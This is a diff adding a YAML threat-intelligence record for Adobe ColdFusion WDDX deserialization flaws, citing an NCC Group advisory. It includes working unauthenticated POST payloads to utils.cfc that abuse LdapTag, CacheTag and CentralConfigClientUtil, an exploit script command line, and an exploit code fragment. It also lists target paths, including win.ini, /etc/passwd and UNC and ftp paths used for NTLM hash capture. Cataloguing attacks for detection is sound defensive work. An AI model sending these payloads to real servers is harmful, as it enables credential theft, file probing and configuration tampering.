@@ -1,0 +1,76 @@
+description: 'Adobe ColdFusion vulnerabilities allow unauthenticated remote attackers
+  to obtain NTLM password hash, verify file/directory existence,
+
+  and set CCS configurations.
+
+  '
+TTPs:
+  processes:
+  - coldfusion.tagext.net.LdapTag
+  - coldfusion.tagext.io.cache.CacheTag
+  - coldfusion.centralconfig.client.CentralConfigClientUtil
+  - python
+  commandline:
+  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=bar _cfclient=true
+    HTTP/1.1 Host: 192.168.198.136:8500 Content-Type: application/x-www-form-urlencoded
+    Content-Length: 202 argumentCollection=<><> version=''1.0''><><> type=''xcoldfusion.tagext.net.LdapTagx''><><>
+    name=''clientCert''>C:\\\\Windows\\\\win.ini'
+  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=foo _cfclient=true
+    HTTP/1.1 Host: 192.168.198.129:8500 Content-Type: application/x-www-form-urlencoded
+    Content-Length: 192 argumentCollection=<><> version=''1.0''><><> type=''acoldfusion.tagext.io.cache.CacheTaga''><><>
+    name=''directory''>/tmp/'
+  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=foo _cfclient=true
+    HTTP/1.1 Host: 192.168.198.129 Connection: close Content-Type: application/x-www-form-urlencoded
+    Content-Length: 216 argumentCollection=<><> version=''1.0''><><> type=''xcoldfusion.centralconfig.client.CentralConfigClientUtilx''><><>
+    name=''clusterName''>EXAMPLE'
+  - 'POST /CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=foo _cfclient=true
+    HTTP/1.1 Host: 192.168.198.129 Connection: close Content-Type: application/x-www-form-urlencoded
+    Content-Length: 212 argumentCollection=<><> version=''1.0''><><> type=''xcoldfusion.centralconfig.client.CentralConfigClientUtilx''><><>
+    name=''env''>development'
+  - '''python script.py --host example.com -p 8500 -pr http -c ''/CFIDE/wizards/common/utils.cfc?method=wizardHash
+    inPassword=bar _cfclient=true'' -v normal execute coldfusion.centralconfig.client.CentralConfigClientUtil
+    setEnv development -t string'''
+  powershell: null
+  scripting_engine:
+  - coldfusion-wddx.py
+  - 'gs): global URL, VERBOSITY # Build URL URL = f''{args.protocol}://{args.host}:{args.port}{args.cfc}''
+    # Set verbosity if args.verbosity == ''none'': VERBOSITY = LogLevel.NONE elif
+    args.verbosity == ''minimal'': VERBOSITY = LogLevel.MINIMAL elif args.verbosity
+    == ''normal'': VERBOSITY = LogLevel.NORMAL elif args.verbosity == ''debug'': VERBOSITY
+    = LogLevel.DEBUG log(LogLevel.NORMAL, f''[#] Target: {URL}'') # Execute if args.command
+    == ''execute'': return execute(args.classpath, args.method, args.argument, args.type)
+    # Directory Existence if args.command == ''directory-exist'': return directoryExists(args.path)
+    # File Existence if args.command == ''file-exist'': return fileExists(args.path)
+    # Set CCS Cluster Name if args.command == ''ccs-cluster-name'': return setCCsClusterName(args.name)
+    # Set CCS Environment if args.command == ''ccs-env'': return setCcsEnv(args.env)
+
+    '
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - 192.168.198.136:8500/CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=bar
+    _cfclient=true
+  - 192.168.198.129:8500/CFIDE/wizards/common/utils.cfc?method=wizardHash inPassword=foo
+    _cfclient=true
+  - process: python
+    destination_address: example.com
+    port: 8500
+  file_activity:
+  - C:\\Windows\\win.ini
+  - /etc/passwd
+  - /tmp/
+  - \\\\192.168.198.128\\TMP
+  - http://192.168.198.128/
+  - ftp://192.168.198.128/
+  - jar://opt/ColdFusion2023/cfusion/lib/cfusion.jar\\!META-INF
+  persistence: null
+  pipes: null
+  process_relations: null
+IOCs:
+  domains:
+  - example.com
+authors:
+- McCaulay Hudson
+reference: https://www.nccgroup.com/research-blog/technical-advisory-adobe-coldfusion-wddx-deserialization-gadgets/
+date_of_publication: September 12, 2023
+file_creation_date: July 30, 2025
